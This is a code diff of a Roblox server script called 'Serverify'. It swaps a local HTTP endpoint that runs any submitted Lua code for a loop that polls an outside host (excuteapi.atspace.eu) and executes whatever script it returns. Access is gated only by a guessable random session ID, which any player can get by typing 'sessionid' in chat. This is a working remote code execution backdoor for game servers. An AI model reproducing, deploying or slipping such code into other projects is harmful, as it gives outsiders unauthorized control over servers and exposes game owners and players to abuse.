@@ -3,77 +3,62 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local ModulesFolder = ServerScriptService.ServerifyInjector.Modules
+local MainScript = ServerScriptService:WaitForChild("Serverify")
 
-local LuaExp = require(ModulesFolder.LuaExp)
-local Loadstring = require(ModulesFolder.Loadstring)
-local attached = false
-local currsessionid = tostring(math.random(1, 2000))
+-- Check if Loadstring module exists
+local Loadstring
+local success, err = pcall(function()
+    Loadstring = require(MainScript:WaitForChild("Loadstring"))
+end)
 
-coroutine.wrap(function ()
-	local app = LuaExp()
-	app.use(LuaExp.json)
-	
-	-- Handle GET request on "/"
-	app.get("/", function (req, res)
-		print('Got request to POST on "/"')
-		res.status(200).send()
-	end)
-	
-	-- Handle POST request to attach a session
-	app.post("/attach", function (req, res)
-		local sessionid = req.body['sessionid']
-		local username = req.body['user']		
-		if sessionid == currsessionid then
-			if not attached then
-				attached = true
-				local player = Players:FindFirstChild(username)
-				if player then
-					ReplicatedStorage:WaitForChild("ServerifyRemotes"):FindFirstChild("Notify"):FireClient(player, "Attached!")
-					ReplicatedStorage:WaitForChild("ServerifyRemotes"):FindFirstChild("PlaceWaterMark"):FireClient(player)
-				else
-					print("Player not found: " .. username)
-				end
-			end
-		end
-		res.status(200).send()
-	end)
-	
-	-- Handle POST request to execute code
-	app.post("/execute", function (req, res)
-		local code = req.body['code']
-		local username = req.body['user']
-		local sessionid = req.body['sessionid']
-		if sessionid == currsessionid then
-			Loadstring(code)()
-			local player = Players:FindFirstChild(username)
-			if player then
-				ReplicatedStorage:WaitForChild("ServerifyRemotes"):FindFirstChild("Notify"):FireClient(player, "Script Executed")
-			else
-				print("Player not found: " .. username)
-			end
-		end
-		res.status(200).send()
-	end)
-	
-	-- Start listening to the session
-	app.listen("ScriptifySession_".. game.PlaceId.. "_".. currsessionid, function (url)
-		print("ScriptifySession listening on ".. url)
-		
-		for _, plr in pairs(Players:GetPlayers()) do
-			plr.Chatted:Connect(function (msg)
-				if string.find(msg, "sessionid") then
-					ReplicatedStorage:WaitForChild("ServerifyRemotes"):FindFirstChild("Notify"):FireClient(plr, "Session id: ".. currsessionid)
-				end
-			end)
-		end
+if not success then
+    warn("Loadstring module could not be found or loaded:", err)
+end
 
-		Players.PlayerAdded:Connect(function (plr)
-			plr.Chatted:Connect(function (msg)
-				if string.find(msg, "sessionid") then
-					ReplicatedStorage:WaitForChild("ServerifyRemotes"):FindFirstChild("Notify"):FireClient(plr, "Session id: ".. currsessionid)
-				end
-			end)		
-		end)
-	end)
-end)()
+local cursessionid = tostring(math.random(1, 1000))
+local lasttime = 0
+local lasthash = "N"
+
+print("Place ID:", game.PlaceId)
+
+-- Player Added Listener
+Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg, rec)
+        if string.find(msg, "sessionid") then
+            local Notify = ReplicatedStorage:FindFirstChild("Notify")
+            if Notify and Notify:IsA("RemoteEvent") then
+                Notify:FireClient(plr, "Session ID - " .. cursessionid)
+            else
+                warn("Notify RemoteEvent not found in ReplicatedStorage.")
+            end
+        end
+    end)
+end)
+
+-- Periodic HTTP request loop
+while wait(2.5) do
+    local success, res = pcall(function()
+        return HttpService:GetAsync("http://excuteapi.atspace.eu/last.php")
+    end)
+    
+    if success then
+        local json = HttpService:JSONDecode(res)
+        local hash = json["hash"]
+        local code = json["script"]
+        local gameid = json["gameid"]
+        local sessionid = json["sessionid"]
+        
+        if hash ~= lasthash and gameid == tostring(game.PlaceId) and sessionid == cursessionid then
+            -- Execute the code if new hash matches
+            local loadSuccess, err = pcall(function()
+                Loadstring:Execute(code)  -- Assuming Execute is a method in Loadstring for running code
+            end)
+            if not loadSuccess then
+                warn("Error executing code:", err)
+            end
+            lasthash = hash
+        end
+    else
+        warn("Failed to retrieve HTTP response:", res)
+    end
+end
